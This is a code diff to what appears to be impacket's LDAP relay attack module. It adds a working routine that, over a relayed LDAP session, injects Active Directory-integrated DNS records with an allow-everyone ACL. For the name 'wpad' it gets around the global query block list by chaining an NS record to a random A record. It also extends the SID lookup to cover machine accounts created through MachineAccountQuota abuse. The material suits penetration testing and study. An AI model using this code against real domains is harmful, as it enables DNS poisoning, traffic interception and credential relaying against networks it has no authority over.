@@ -22,6 +22,7 @@ import datetime
 import binascii
 import codecs
 import re
+import dns.resolver
 import ldap3
 import ldapdomaindump
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
@@ -30,6 +31,8 @@ from ldap3.protocol.formatters.formatters import format_sid
 from ldap3.utils.conv import escape_filter_chars
 import os
 from Cryptodome.Hash import MD4
+from ipaddress import IPv4Address, AddressValueError
+from functools import partial
 
 from impacket import LOG
 from impacket.examples.ldap_shell import LdapShell
@@ -408,9 +411,9 @@ class LDAPAttack(ProtocolAttack):
         # Dictionary for restore data
         restoredata = {}
 
-        # Query for the sid of our user
+        # Query for the sid of our incoming account (can be a user or a computer in case of a newly creation computer account (i.e. MachineAccountQuot abuse)
         try:
-            self.client.search(userDn, '(objectClass=user)', attributes=['sAMAccountName', 'objectSid'])
+            self.client.search(userDn, '(objectClass=*)', attributes=['sAMAccountName', 'objectSid'])
             entry = self.client.entries[0]
         except IndexError:
             LOG.error('Could not retrieve infos for user: %s' % userDn)
@@ -771,6 +774,136 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Principals who can enroll using template `%s`: %s" % (entry["attributes"]["name"],
                      ", ".join(("`" + sid_map[principal] + "`" for principal in enrollment_principals))))
 
+        LOG.info("Done dumping ADCS info")
+
+    def addDnsRecord(self, name, ipaddr):
+        # https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1
+        def new_dns_namearray(data):
+            index_array = [pos for pos, char in enumerate(data) if char == '.']
+            name_array = bytearray()
+            if len(index_array) > 0:
+                name_start = 0
+                for index in index_array:
+                    name_end = index - name_start
+                    name_array.append(name_end)
+                    name_array.extend(data[name_start:name_end+name_start].encode("utf8"))
+                    name_start = index + 1
+                name_array.append(len(data) - name_start)
+                name_array.extend(data[name_start:].encode("utf8"))
+            else:
+                name_array.append(len(data))
+                name_array.extend(data.encode("utf8"))
+            return name_array
+
+        def new_dns_record(data, type):
+            if type == "A":
+                addr_data = data.split('.')
+                dns_type = bytearray((0x1, 0x0))
+                dns_length = int_to_4_bytes(len(addr_data))[0:2]
+                dns_data = bytearray(map(int, addr_data))
+            elif type == "NS":
+                dns_type = bytearray((0x2, 0x0))
+                dns_length = int_to_4_bytes(len(data) + 4)[0:2]
+                dns_data = bytearray()
+                dns_data.append(len(data) + 2)
+                dns_data.append(len(data.split(".")))
+                dns_data.extend(new_dns_namearray(data))
+                dns_data.append(0)
+            else:
+                return False
+
+            dns_ttl = bytearray(reversed(int_to_4_bytes(60)))
+            dns_record = bytearray(dns_length)
+            dns_record.extend(dns_type)
+            dns_record.extend(bytearray((0x05, 0xF0, 0x00, 0x00)))
+            dns_record.extend(int_to_4_bytes(get_next_serial_p()))
+            dns_record.extend(dns_ttl)
+            dns_record.extend((0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
+            dns_record.extend(dns_data)
+            return dns_record
+
+        def int_to_4_bytes(num):
+            arr = bytearray()
+            for i in range(4):
+                arr.append(num & 0xff)
+                num >>= 8
+            return arr
+
+        # https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
+        def get_next_serial(server, zone):
+            dnsresolver = dns.resolver.Resolver()
+            dnsresolver.nameservers = [server]
+            res = dnsresolver.resolve(zone, 'SOA',tcp=True)
+            for answer in res:
+                return answer.serial + 1
+
+        try:
+            dns_naming_context = next((nc for nc in self.client.server.info.naming_contexts if "domaindnszones" in nc.lower()))
+        except StopIteration:
+            LOG.error('Could not find DNS naming context, aborting')
+            return
+
+        domaindn = self.client.server.info.other['defaultNamingContext'][0]
+        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+        dns_base_dn = 'DC=%s,CN=MicrosoftDNS,%s' % (domain, dns_naming_context)
+
+        get_next_serial_p = partial(get_next_serial, self.client.server.address_info[0][4][0], domain)
+
+        LOG.info('Checking if domain already has a `%s` DNS record' % name)
+        if self.client.search(dns_base_dn, '(name=%s)' % escape_filter_chars(name), search_scope=ldap3.LEVEL):
+            LOG.error('Domain already has a `%s` DNS record, aborting' % name)
+            return
+
+        LOG.info('Domain does not have a `%s` record!' % name)
+
+        ACL_ALLOW_EVERYONE_EVERYTHING = b'\x01\x00\x04\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\n\x14\x00\x00\x00\x00\x10\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'
+
+        a_record_name = name
+        is_name_wpad = (a_record_name.lower() == 'wpad')
+
+        if is_name_wpad:
+            LOG.info('To add the `wpad` name, we need to bypass the GQBL: we\'ll first add a random `A` name and then add `wpad` as `NS` pointing to that name')
+            a_record_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
+
+        # First add an A record pointing to the provided IP
+        a_record_dn = 'DC=%s,%s' % (a_record_name, dns_base_dn)
+        a_record_data = {
+            'dnsRecord': new_dns_record(ipaddr, "A"),
+            'objectCategory': 'CN=Dns-Node,%s' % self.client.server.info.other['schemaNamingContext'][0],
+            'dNSTombstoned': False,
+            'name': a_record_name,
+            'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING,
+        }
+
+        LOG.info('Adding `A` record `%s` pointing to `%s` at `%s`' % (a_record_name, ipaddr, a_record_dn))
+        if not self.client.add(a_record_dn, ['top', 'dnsNode'], a_record_data):
+            LOG.error('Failed to add `A` record: ' % str(self.client.result))
+            return
+
+        LOG.info('Added `A` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % a_record_name)
+
+        if not is_name_wpad:
+            return
+
+        # Then add the wpad NS record
+        ns_record_name = 'wpad'
+        ns_record_dn = 'DC=%s,%s' % (ns_record_name, dns_base_dn)
+        ns_record_value = a_record_name + "." + domain
+        ns_record_data = {
+            'dnsRecord': new_dns_record(ns_record_value, "NS"),
+            'objectCategory': 'CN=Dns-Node,%s' % self.client.server.info.other['schemaNamingContext'][0],
+            'dNSTombstoned': False,
+            'name': ns_record_name,
+            'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING,
+        }
+
+        LOG.info('Adding `NS` record `%s` pointing to `%s` at `%s`' % (ns_record_name, ns_record_value, ns_record_dn))
+        if not self.client.add(ns_record_dn, ['top', 'dnsNode'], ns_record_data):
+            LOG.error('Failed to add `NS` record `wpad`: ' % str(self.client.result))
+            return
+
+        LOG.info('Added `NS` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % ns_record_name)
+
 
     def run(self):
         #self.client.search('dc=vulnerable,dc=contoso,dc=com', '(objectclass=person)')
@@ -951,6 +1084,27 @@ class LDAPAttack(ProtocolAttack):
             dumpedAdcs = True
             self.dumpADCS()
             LOG.info("Done dumping ADCS info")
+
+        if self.config.adddnsrecord:
+            name = self.config.adddnsrecord[0]
+            ipaddr = self.config.adddnsrecord[1]
+
+            dns_name_ok = True
+            dns_ipaddr_ok = True
+
+            # DNS name can either be a wildcard or just contain alphanum and hyphen
+            if (name != '*') and (re.search(r'[^0-9a-z-]', name, re.I)):
+                LOG.error("Invalid name for DNS record")
+                dns_name_ok = False
+
+            try:
+                IPv4Address(ipaddr)
+            except AddressValueError:
+                LOG.error("Invalid IPv4 for DNS record")
+                dns_ipaddr_ok = False
+
+            if dns_name_ok and dns_ipaddr_ok:
+                self.addDnsRecord(name, ipaddr)
 
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
